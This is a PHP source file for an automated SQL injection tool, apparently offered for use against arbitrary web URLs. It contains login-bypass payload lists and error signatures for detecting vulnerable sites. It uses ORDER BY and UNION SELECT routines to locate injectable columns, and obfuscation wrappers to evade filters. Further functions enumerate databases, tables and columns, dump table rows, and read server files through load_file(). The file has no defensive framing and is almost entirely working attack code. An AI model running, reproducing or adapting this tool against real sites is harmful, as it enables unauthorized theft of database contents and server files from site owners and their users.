<?php

class SqlDigger
{
	private $url;
	private $type=0;
	private $delimiter='0x27';
	private $num_columns_limit=20;
	public $_INJECTION=array();
	public $debug=false;
	///******* IMPORTANT ARRAYS *************///

	//normal sqli
	private $methods=array(
	    "%27",
	    "999999.9%27",
	    "+and+1%3D1",
	    "+and+1%3E1"
	);

	//login bypass
	private $login_methods=array(
	    "' or '1'='1","
	'or'1=1'","
	' or 'x'='x","
	' or 0=0 --",'
	" or 0=0 --',"
	or 0=0 --","
	' or 0=0 #","
	\" or 0=0 #","
	or 0=0 # ","
	' or 'x'='x","
	\" or \"x\"=\"x","
	') or ('x'='x","
	' or 1=1--","
	\" or 1=1--","
	or 1=1--","
	' or a=a--","
	\" or \"a\"=\"a","
	') or ('a'='a","
	\") or (\"a\"=\"a","
	hi\" or \"a\"=\"a","
	hi\" or 1=1 --","
	hi' or 1=1 --");

	//sqli success detection
	private $errors=array(
	    "Microsoft OLE DB Provider for ODBC Drivers",
	    "mysql_",
		"You have an error in your SQL syntax",
	    "mysql_num_rows()",
	    "Warning: Fatal error",
	    "Incorrect syntax",
	    "mysql_fetch_array()");

	//columns obtain methods
	private $columns_method=array(0=>'%20order%20by%20-NUM---',1=>"%20order%20by%20-NUM---+");

	//common errors for num colm success detection
	private $columns_error=array(0=>'Unknown column',1=>'mysql_fetch_array()');

	//bypass error messages
	private $fud_rows=array(
	    0=>"convert(-ROW- using latin1)",
	    1=>"unhex(hex(-ROW-))",
	    2=>"aes_decrypt(aes_encrypt(-ROW-,1),1)",
	    3=>"UNCOMPRESS(COMPRESS(-ROW-))");

	//great info to obtain
	private $general_info=array(
	    "version"=>array("@@version","version()"),
	    "datadir"=>array("@@datadir","datadir()"),
	    "database"=>array("@@database","database()"),
	    "current_user"=>array("@@current_user","current_user()","user"),
	    "hostname"=>array("@@hostname","hostname()"),
	    "basedir"=>array("@@basedir","basedir()"),
	
	);

	//union select queries
	private $union_select=array(
	    0=>array('union'=>"%20union%20all%20select%20",'coletillas'=>array("--","--+")),
	    1=>array('union'=>"%27%20union%20select%20all%20",'coletilla'=>"--+")
	);

	///******* IMPORTANT ARRAYS *************///
	/**
	* setup new injection or recover older
	* @param array $array
	* @return void
	*/		
	public function __construct($array)
	{
		if($array['url']=='' || strpos($array['url'],'http://')===false){
			return false;
		}
		$this->url=$array['url'];
		$this->_INJECTION=$array;
	}
	/**
	* checks injection type and if target is vulnerable 
	* @return array
	*/
	public function init()
	{
		$vulnerable=false;
		if($this->type===1){
		    $methods=$this->login_methods;
		}else{
			$methods=$this->methods;
		}

		//Lets check if its vulnerable
		foreach($methods as $method)
		{
		    $content=$this->query($method);
		    foreach($this->errors as $error){
		        if(strpos($content,$error)!==false){
		            $vulnerable=true;
		            $this->_INJECTION["method"]=$method;
		            $this->_INJECTION["error"]=$error;
		            break;
		        }
		    }
			if($vulnerable){
				 break;
			}
		}	
		return $this->_INJECTION;
	}
	/**
	* gets column count and affected columns 
	* @return array
	*/
	public function getRows()
	{
		$found=false;
		foreach($this->columns_method as $num_method=>$column_method)
		{
	        //Check default column error message and decide method
	        $content=$this->query(str_replace("-NUM-",9999,$column_method));
	        
			foreach($this->columns_error as $column_error)
			{
	            if(strpos($content,$column_error)!==false){
	                $this->_INJECTION["column"]["error"]=$column_error;
	                break;
	            }

	        }
			
			//lets get column count
			if(isset($this->_INJECTION["column"]["error"]))
			{
				$i=1;
				while($i!=$this->num_columns_limit && $i>0)
                {
                    $content=$this->query(str_replace("-NUM-",$i,$column_method));
                    if(strpos($content, $this->_INJECTION["column"]["error"])!==false){
                        $last_fail=$i;
                        $i--;
                    }else{
                        $last_win=$i;
                        $i++;
                    }

                    $near=$last_win+1;
                    if($last_win!=0 && $last_fail!=0){
                        if($near==$last_fail){
                            $num_columns=$last_win;
							$this->_INJECTION["column"]['num_columns']=$num_columns;
							$this->_INJECTION["column"]["url_columns"]=str_replace("-NUM-",$i,$column_method);
                            $found=true;
                            //para('num columns:'.$num_columns);
                            break;
                        }
                    }

                }	
			}
			if($found){break;}
		}
		
		//now lets find a visible column
		if($found)
		{
			$num_method=0;
		    $union_query=$this->union_select[$num_method]['union'];
		    $union_query_hack=$union_query;
		    $i=1;

		    while($i!=$this->_INJECTION["column"]['num_columns']+1)
		    {

		        if($i==1){
		            $union_query.=$i;
		            $union_query_hack.=$i*11111;
		            $query_hack.=$i*11111;//for false positives
		        }else{
		            $union_query.=','.$i;
		            $union_query_hack.=','.$i*11111;
		            $query_hack.=','.$i*11111;//for false positives
		        }

		        //now check if wee see any row
		        $content=$this->query("999999.9%27".$union_query_hack.$this->union_select[$num_method]['coletillas'][0],array('force'=>true));
		        $content2=$this->query("999999.9%27".$union_query_hack.$this->union_select[$num_method]['coletillas'][1],array('force'=>true));

		        $o=1;
		        while($o<=$i)
				{
		            $esto=$o*11111;

		            $content=str_replace($query_hack,'',$content);
		            $content2=str_replace($query_hack,'',$content2);

		            if(strpos($content,"$esto")!==false || strpos($content2,"$esto")!==false){
						if(strpos($content,"$esto")!==false){
							$this->_INJECTION["coletilla"]=$this->union_select[$num_method]['coletillas'][0];
						}else{
							$this->_INJECTION["coletilla"]=$this->union_select[$num_method]['coletillas'][1];
						}
		                $affected_row=$o;
		                break;
		            }
		            $o++;
		        }

		        if($affected_row!='')
				{
		            $vulnerable=true;
		            $this->_INJECTION["method"]=$num_method;
		            $this->_INJECTION["column"]['affected']=$affected_row;
					$this->_INJECTION['query']="999999.9%27".$this->union_select[$num_method]['union'];
					
					$columns=$this->_INJECTION["column"]['num_columns'];
					$e=1;
					
					//rebuild query
					while($e<=$columns)
					{
						if($e==$this->_INJECTION["column"]['affected'])
						{
							if($e==1){
								$this->_INJECTION['query'].='-1135-';
							}else{
								$this->_INJECTION['query'].=',-1135-';
							}	
						}else{
							if($e==1){
								$this->_INJECTION['query'].=$e;
							}else{
								$this->_INJECTION['query'].=','.$e;
							}
						}
						$e++;
					}
		            break;
		        }

		        $i++;
		    }
		}
		
		return $this->_INJECTION;	
	}
	/**
	* get current table name
	* @return string 
	**/
	public function currentTable()
	{
		$arr=array(
			'row'=>'database()',
			'after'=>' from information_schema.schemata'.$this->_INJECTION['coletilla'],
			);
		$this->_INJECTION['currentTable']=$this->get($arr);	
		return $this->_INJECTION['currentTable'];
	}
	/**
	* shows what you want from current injection
	* @param string $what read the switch (databases,tables,columns,files)
	* @param array $extra (extra data needed, db, table, etc..)
	* 
	*/
	public function show($what,$extra=array())
	{
		switch($what)
		{
			case 'databases':
				$i=0;
				$working=true;
				$dbs=array();
				while($working)
				{
					$arr=array(
						'row'=>'schema_name',
						'after'=>' from `information_schema`.schemata limit '.$i.',1'.$this->_INJECTION['coletilla'],
						'canBeArray'=>true,
					);
					$r=$this->get($arr);
					if($r==null  || $r==''){
						return $dbs;
					}
					$dbs[]=$r;
					$this->_INJECTION['databases'][$r]=true;
					$i++;	
				}
				return $dbs;
				
			break;
			case 'tables':
				if(!isset($extra['db']) ||$extra['db']==''){
					throw Exception('missing db');
				}
				$extra['db']=trim($extra['db']);
				$arr=array(
						'row'=>'group_concat(table_name)',
						'after'=>' from `information_schema`.tables where table_schema='.$this->strToHex($extra['db']).' '.$this->_INJECTION['coletilla'],
						'canBeArray'=>true,
					);
				$tables=$this->get($arr);				
				
				if(strpos($tables,',')!==false){
					$tables=explode(',',$tables);
				}
				if(!is_array($tables)){
					$tables=array($tables);
				}
				
				$this->_INJECTION['databases'][$extra['db']]=array();
				
				foreach($tables as $table){
					$this->_INJECTION['databases'][$extra['db']][$table]=true;
				}				

				return $tables;
			break;
			case 'columns':
				$extra['db']=trim($extra['db']);
				$extra['table']=trim($extra['table']);
				
				$arr=array(
						'row'=>'group_concat(column_name)',
						'after'=>' from `information_schema`.columns where table_schema='.$this->strToHex($extra['db']).' and table_name='.$this->strToHex($extra['table']).' '.$this->_INJECTION['coletilla'],
						'canBeArray'=>true,
					);
				$r=$this->get($arr);
				if(strpos($r,',')!==false){
					$r=explode(',',$r);
				}
				if(!is_array($r)){
					$r=array($r);
				}

				$this->_INJECTION['databases'][$extra['db']][$extra['table']]=$r;
				
				return $r;
			break;
			case 'data':
				$extra['db']=trim($extra['db']);
				$extra['table']=trim($extra['table']);
				$i=0;
				$row='';
				$dump=array();				
				
				//first we need to get table count
				$arr=array(
						'row'=>'count(*)',
						'after'=>' from `'.$extra['db'].'`.'.$extra['table'].' '.$this->_INJECTION['coletilla'],
						'canBeArray'=>true,
					);
				$count=$this->get($arr);
				
				if($count==''|| $count==0){
					return 0;
				}
				foreach($extra['column'] as $column){
					if($row==''){
						$row.='unhex(Hex(cast('.$extra['table'].'.'.$column.'%20as%20char)))';
					}else{
						$row.=',unhex(Hex(cast('.$extra['table'].'.'.$column.'%20as%20char)))';
					}
				}
				
				while($i<=$count)
				{
					$arr=array(
						'row'=>$row,
						'after'=>' from `'.$extra['db'].'`.'.$extra['table'].' limit '.$i.',1 '.$this->_INJECTION['coletilla'],
						'canBeArray'=>true,
					);
					$r=$this->get($arr);

					$i++;
					if($r!='' && $r!=null){
						$dump[]=$r;
					}
					
				}				
				
				return array(
					'count'=>$count,
					'columns'=>$extra['column'],
					'data'=>$dump,
					);
			break;
			case 'file':
				if(!isset($extra) || $extra==''){
					throw Exception('missing file');
				}
				$arr=array(
						'row'=>'load_file('.$this->strToHex($extra).')',
						'canBeArray'=>false,
				);
				$r=$this->get($arr);
				
				return $r;
			break;
		}
		return false;
	}
	/**
	* matches for injection results
	* @param string $var injection html content
	* @param boolean $canBeArray expect to recieve an array of result (columns,tables..) or content file
	* 
	*/
	public function decrypt($var,$canBeArray=true)
	{
		//$p="/\'\~(.*?)\~\'/";
		$p="`\'\~(.*?)\~\'`ims";
		preg_match($p,$var,$r);
		//pre_print($var,$r);
		
		if(strpos($r[1],'~')!==false && $canBeArray){			
			$r=explode('~',$r[1]);
		}else{
			$r=$r[1];
		}
		
		return $r;
	}
	/**
	* encrypts the query and prepares it to reception
	* @param string $command
	* 
	*/
	public function encrypt($command)
	{
		return 'concat_ws(0x7e,0x27,'.$command.',0x27)';
	}
	/**
	* converts string to hexadecimal
	* @param string $string
	* @return string
	*/
	private function strToHex($string)
	{
	    $hex='';
	    for ($i=0; $i < strlen($string); $i++)
	    {
	        $hex .= dechex(ord($string[$i]));
	    }
	    return '0x'.$hex;
	}
	/**
	* converts hexadecimal to string
	* @param string $hex
	* 
	*/
	private function hexToStr($hex)
	{
	    $string='';
	    for ($i=0; $i < strlen($hex)-1; $i+=2)
	    {
	        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
	    }
	    return $string;
	}
	/**
	* prepares and makes the query 
	* @param array $arr
	* @return string
	*/
	public function get($arr)
	{
		$arr['row']=$this->encrypt($arr['row']);
		
		$q=str_replace('-1135-',$arr['row'],$this->_INJECTION['query']);
		
		if(isset($arr['after'])){
			$q.=str_replace(' ','%20',$arr['after']);
		}else{
			$q.='%20'.$this->_INJECTION['coletilla'];
		}
		$r=$this->query($q,array('force'=>true));

		return $this->decrypt($r,$arr['canBeArray']);
	}
	/**
	* checks if injection method is needed before querying
	* @param string $q
	* @param array $arr
	* 
	*/
	private function query($q,$arr=array())
	{
		if(isset($this->_INJECTION["method"]) && !isset($arr['force'])){
			$url=$this->url.$this->_INJECTION["method"].$q;
		}else{
			$url=$this->url.$q;
		}
		return $this->curl($url);
	}
	/**
	* makes curls petitions
	* @param string $url
	* @param string $data : post data
	* @param boolean $isLogin : use or not cookies
	* @return string
	*/
	private function curl($url, $data = '', $isLogin = 0) 
	{
		if($this->debug){
			echo $url."<br>";
		}		
	    $ch = curl_init($url);
	    $header = array();
	    $header[0]  = "Accept: text/xml,application/xml,application/xhtml+xml,";
	    $header[0] .= "text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5";
	    $header[]   = "Cache-Control: max-age=0";
	    $header[]   = "Connection: keep-alive";
	    $header[]   = "Keep-Alive: 300";
	    $header[]   = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
	    $header[]   = "Accept-Language: en-us,en;q=0.5";
	    $header[]   = "Pragma: "; // 1135browsers keep this blank.

	    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7');
	    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	    if($isLogin)
	        curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
	    else
	        curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
	    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
	    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		
		if($data!=''){
			curl_setopt($ch, CURLOPT_POST, true);
			 curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		}
	    
	    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	    curl_setopt($ch, CURLOPT_URL, $url);
	   
	    return curl_exec($ch);
	}
}
?>
